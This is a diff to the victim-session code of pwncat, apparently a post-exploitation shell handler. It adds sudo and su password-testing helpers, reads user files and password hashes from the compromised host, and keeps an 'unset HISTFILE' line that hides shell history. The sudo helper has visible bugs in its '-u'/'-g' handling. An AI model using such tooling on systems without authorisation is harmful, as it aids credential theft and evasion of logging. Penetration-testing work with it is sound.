@@ -6,8 +6,10 @@ import shlex
 import socket
 import sys
 import time
-from typing import Dict, Optional, IO, Any, List, Tuple, Iterator, Union
+from typing import Dict, Optional, IO, Any, List, Tuple, Iterator, Union, Generator
 
+import paramiko
+import pkg_resources
 import requests
 from colorama import Fore
 from sqlalchemy.engine import Engine, create_engine
@@ -24,6 +26,7 @@ from pwncat.gtfobins import GTFOBins, Capability, Stream
 from pwncat.remote import RemoteService
 from pwncat.tamper import Tamper, TamperManager
 from pwncat.util import State
+import pwncat.enumerate
 
 
 def remove_busybox_tamper():
@@ -120,7 +123,9 @@ class Victim:
             "nc": ["netcat", "ncat"],
         }
         # GTFObins manager for this host
-        self.gtfo: GTFOBins = GTFOBins("data/gtfobins.json", self.which)
+        self.gtfo: GTFOBins = GTFOBins(
+            pkg_resources.resource_filename("pwncat", "data/gtfobins.json"), self.which
+        )
         # Whether the user has pressed the defined prefix
         self.has_prefix = False
         # Parser for local command input
@@ -136,12 +141,17 @@ class Victim:
         self.privesc: privesc.Finder = None
         # Persistence manager
         self.persist: persist.Persistence = persist.Persistence()
+        # The enumeration manager
+        self.enumerate: pwncat.enumerate.Enumerate = pwncat.enumerate.Enumerate()
         # Database engine
         self.engine: Engine = None
         # Database session
         self.session: Session = None
         # The host object as seen by the database
         self.host: pwncat.db.Host = None
+        # The current user. This is cached while at the `pwncat` prompt
+        # and reloaded whenever returning from RAW mode.
+        self.cached_user: str = None
 
     def reconnect(
         self, hostid: str, requested_method: str = None, requested_user: str = None
@@ -237,7 +247,7 @@ class Victim:
             hostname = self.run("hostname -f").strip()
         else:
             util.warn("hostname command not found; using peer address")
-            hostname = client.getpeername().encode("utf-8")
+            hostname = client.getpeername()[0].encode("utf-8")
         mac = None
 
         # Use ifconfig if available or ip link show.
@@ -324,10 +334,12 @@ class Victim:
             raise RuntimeError("no available methods to spawn a pty!")
 
         # Open the PTY
-        util.info(
-            f"opening pseudoterminal via {Fore.GREEN}{method}{Fore.RESET}", overlay=True
-        )
-        self.run(method_cmd, wait=False)
+        if not isinstance(self.client, paramiko.Channel):
+            util.info(
+                f"opening pseudoterminal via {Fore.GREEN}{method}{Fore.RESET}",
+                overlay=True,
+            )
+            self.run(method_cmd, wait=False)
 
         # This stuff won't carry through to the PTY, so we need to reset it again.
         util.info("setting terminal prompt", overlay=True)
@@ -471,7 +483,7 @@ class Victim:
                             f"pruning {Fore.RED}{name}{Fore.RESET} from busybox"
                         )
 
-            util.success(f"pruned {len(provides)-len(new_provides)} setuid entries")
+            util.success(f"pruned {len(provides) - len(new_provides)} setuid entries")
             provides = new_provides
 
         # Let the class know we now have access to busybox
@@ -569,13 +581,6 @@ class Victim:
         :return: The full path to the requested binary or None if it was not found.
         """
 
-        if self.host.busybox is not None:
-            if name in self.busybox_provides:
-                if quote:
-                    return f"{shlex.quote(str(self.busybox_path))} {name}"
-                else:
-                    return f"{self.busybox_path} {name}"
-
         binary = (
             self.session.query(pwncat.db.Binary)
             .filter_by(name=name, host_id=self.host.id)
@@ -626,16 +631,19 @@ class Victim:
                     if binding.strip().startswith("pass"):
                         self.client.send(data)
                         binding = binding.lstrip("pass")
+                    else:
+                        self.restore_local_term()
+                        sys.stdout.write("\n")
 
-                    self.restore_local_term()
-                    sys.stdout.write("\n")
+                        # Update the current user
+                        self.update_user()
 
-                    # Evaluate the script
-                    self.command_parser.eval(binding, "<binding>")
+                        # Evaluate the script
+                        self.command_parser.eval(binding, "<binding>")
 
-                    self.flush_output()
-                    self.client.send(b"\n")
-                    self.saved_term_state = util.enter_raw_mode()
+                        self.flush_output()
+                        self.client.send(b"\n")
+                        self.saved_term_state = util.enter_raw_mode()
 
                 except KeyError:
                     pass
@@ -690,6 +698,8 @@ class Victim:
             self._state = State.COMMAND
             # Hopefully this fixes weird cursor position issues
             util.success("local terminal restored")
+            # Reload the current user name
+            self.update_user()
             # Setting the state to local command mode does not return until
             # command processing is complete.
             self.command_parser.run()
@@ -700,6 +710,8 @@ class Victim:
             self._state = State.SINGLE
             # Hopefully this fixes weird cursor position issues
             sys.stdout.write("\n")
+            # Update the current user
+            self.update_user()
             # Setting the state to local command mode does not return until
             # command processing is complete.
             self.command_parser.run_single()
@@ -791,6 +803,7 @@ class Victim:
         if wait:
 
             response = self.recvuntil(edelim.encode("utf-8"))
+
             response = response.split(edelim.encode("utf-8"))[0]
             if sdelim.encode("utf-8") in response:
                 response = b"\n".join(response.split(b"\n")[1:])
@@ -838,8 +851,14 @@ class Victim:
 
         if delim:
             # Receive until we get our starting delimeter on a line by itself
-            while not self.recvuntil(b"\n").startswith(sdelim.encode("utf-8")):
-                pass
+            while True:
+                x = self.recvuntil(b"\n")
+                if x.startswith(sdelim.encode("utf-8")):
+                    break
+
+            data = self.client.recv(len(command), socket.MSG_PEEK)
+            if data == command.encode("utf-8"):
+                self.client.recv(len(command))
 
         return sdelim, edelim
 
@@ -1036,6 +1055,34 @@ class Victim:
                 access |= util.Access.PARENT_WRITE
 
         return access
+
+    def listdir(self, path: str) -> Generator[str, None, None]:
+        """
+        List the contents of the specified directory.
+
+        Raises the following exceptions:
+
+        - FileNotFoundError: the directory does not exist
+        - NotADirectoryError: the path is not a directory
+        - PermissionError: you don't have permission to list the directory
+
+        :param path: the path to the directory
+        :return: generator of file paths within the directory
+        """
+
+        # Ensure the path exists and we are allowed to read it
+        access = self.access(path)
+        if util.Access.DIRECTORY not in access and util.Access.EXISTS in access:
+            raise NotADirectoryError
+        if util.Access.EXISTS not in access:
+            raise FileNotFoundError
+        if util.Access.EXECUTE not in access:
+            raise PermissionError
+
+        with self.subprocess("ls --color=never --all -1", "r") as pipe:
+            for line in pipe:
+                line = line.strip().decode("utf-8")
+                yield line
 
     def open_read(
         self, path: str, mode: str
@@ -1343,8 +1390,19 @@ class Victim:
             raise PermissionError("no password provided and whoami != root!")
 
         if current_user["uid"]["id"] != 0:
+
+            # We try to use the `timeout` command to speed up the case where
+            # the attempted password is incorrect. If it doesn't exist, we
+            # just use a regular `su`, which will take a couple seconds to
+            # timeout depeding on your authentication settings.
+            timeout = self.which("timeout")
+            if timeout is not None:
+                command = f'timeout 0.5 su {user} -c "echo good" || echo failure'
+            else:
+                command = f'su {user} -c "echo good" || echo failure'
+
             # Verify the validity of the password
-            self.env(["su", user, "-c", "echo good"], wait=False)
+            self.run(command, wait=False)
             self.recvuntil(b": ")
             self.client.send(password.encode("utf-8") + b"\n")
 
@@ -1370,6 +1428,92 @@ class Victim:
             self.recvuntil(b": ")
             self.client.sendall(password.encode("utf-8") + b"\n")
             self.flush_output()
+
+    def sudo(
+        self,
+        command: str,
+        user: Optional[str] = None,
+        group: Optional[str] = None,
+        as_is: bool = False,
+        wait: bool = True,
+        password: str = None,
+        stream: bool = False,
+        **kwargs,
+    ):
+        """
+        Run the specified command with sudo. If specified, "user" and/or "group" options
+        will be added to the command.
+
+        If as_is is true, the command string is assumed to contain "sudo" in it and "user"/"group"
+        are not processed. This enables you to use a pre-built command, but utilize the standard
+        processing of user/password information and communication.
+
+        :param command: the command/options to pass to sudo. This is appended
+            to the sudo command, so it can contain other options such as "-l"
+        :param user: the user to run as. this adds a "-u" option to the sudo command
+        :param group: the group to run as. this adds a "-g" option to the sudo command
+        :return: the command output or None if wait is False
+        """
+
+        if as_is:
+            sudo_command = command
+        else:
+            sudo_command = f"sudo -p 'Password: '"
+
+            if user is not None:
+                sudo_command += f"-u {user}"
+            if group is not None:
+                sudo_command += f"-u {group}"
+
+            sudo_command += f" {command}"
+
+        if password is None:
+            password = self.current_user.password
+
+        if stream:
+            pipe = self.subprocess(sudo_command, **kwargs)
+        else:
+            sdelim, edelim = pwncat.victim.process(sudo_command, delim=True)
+
+        output = self.peek_output(some=True).lower()
+        if (
+            b"[sudo]" in output
+            or b"password for " in output
+            or output.endswith(b"password: ")
+            or b"lecture" in output
+        ):
+            if password is None:
+                self.client.send(util.CTRL_C)
+                raise PermissionError(f"{self.current_user.name}: no known password")
+
+            self.flush_output()
+
+            self.client.send(password.encode("utf-8") + b"\n")
+
+            old_timeout = pwncat.victim.client.gettimeout()
+            pwncat.victim.client.settimeout(5)
+            output = pwncat.victim.peek_output(some=True)
+            pwncat.victim.client.settimeout(old_timeout)
+
+            if (
+                b"[sudo]" in output
+                or b"password for " in output
+                or b"sorry," in output
+                or b"sudo: " in output
+            ):
+                pwncat.victim.client.send(util.CTRL_C)
+                pwncat.victim.recvuntil(b"\n")
+                raise PermissionError(f"{self.current_user.name}: incorrect password")
+
+        if stream:
+            return pipe
+
+        # The user didn't want to wait, give them the ending delimiter
+        if not wait:
+            return edelim
+
+        # Return the output of the process
+        return self.recvuntil(edelim.encode("utf-8")).split(edelim.encode("utf-8"))[0]
 
     def raw(self, echo: bool = False):
         """
@@ -1412,11 +1556,11 @@ class Victim:
             try:
                 new = self.client.recv(4096)
                 if len(new) == 0:
-                    if len(output) > 0 or some == False:
+                    if len(output) > 0 or some is False:
                         break
                 output += new
             except (socket.timeout, BlockingIOError):
-                if len(output) > 0 or some == False:
+                if len(output) > 0 or some is False:
                     break
 
         self.client.settimeout(old_timeout)
@@ -1450,13 +1594,14 @@ class Victim:
 
         return output
 
-    def reset(self):
+    def reset(self, hard: bool = True):
         """
         Reset the remote terminal using the ``reset`` command. This also restores
         your prompt, and sets up the environment correctly for ``pwncat``.
         
         """
-        self.run("reset", wait=False)
+        if hard:
+            self.run("reset", wait=False)
         self.has_cr = True
         self.has_echo = True
         self.run("unset HISTFILE; export HISTCONTROL=ignorespace")
@@ -1504,8 +1649,15 @@ class Victim:
         
         :return: str, the current user name
         """
-        result = self.run("whoami")
-        return result.strip().decode("utf-8")
+        return self.cached_user
+
+    def update_user(self):
+        """
+        Requery the current user
+        :return: the current user
+        """
+        self.cached_user = self.run("whoami").strip().decode("utf-8")
+        return self.cached_user
 
     def getenv(self, name: str):
         """
@@ -1578,6 +1730,9 @@ class Victim:
         """
 
         ident = self.id
+        # Keep a list of users by name so we can remove users that no longer exist
+        current_users = []
+        # Same as above for
 
         # Clear the user cache
         with self.open("/etc/passwd", "r") as filp:
@@ -1601,6 +1756,13 @@ class Victim:
                 user.shell = line[6]
                 if user not in self.host.users:
                     self.host.users.append(user)
+                current_users.append(user.name)
+
+        # Remove users that don't exist anymore
+        for user in self.host.users:
+            if user.name not in current_users:
+                self.session.delete(user)
+                self.host.users.remove(user)
 
         with self.open("/etc/group", "r") as filp:
             for line in filp:
@@ -1657,6 +1819,11 @@ class Victim:
                     else:
                         user.hash = None
 
+        # Reload the host object
+        self.host = (
+            self.session.query(pwncat.db.Host).filter_by(id=self.host.id).first()
+        )
+
         return self.users
 
     @property
@@ -1681,6 +1848,13 @@ class Victim:
 
         return known_users
 
+    @property
+    def groups(self) -> Dict[str, pwncat.db.Group]:
+        if len(self.host.groups) == 0:
+            self.reload_users()
+
+        return {g.name: g for g in self.host.groups}
+
     def find_user_by_id(self, uid: int):
         """
         Locate a user in the database with the specified user ID.
@@ -1690,7 +1864,7 @@ class Victim:
         :returns: str
         """
 
-        for user in self.users:
+        for user in self.users.values():
             if user.id == uid:
                 return user
         raise KeyError
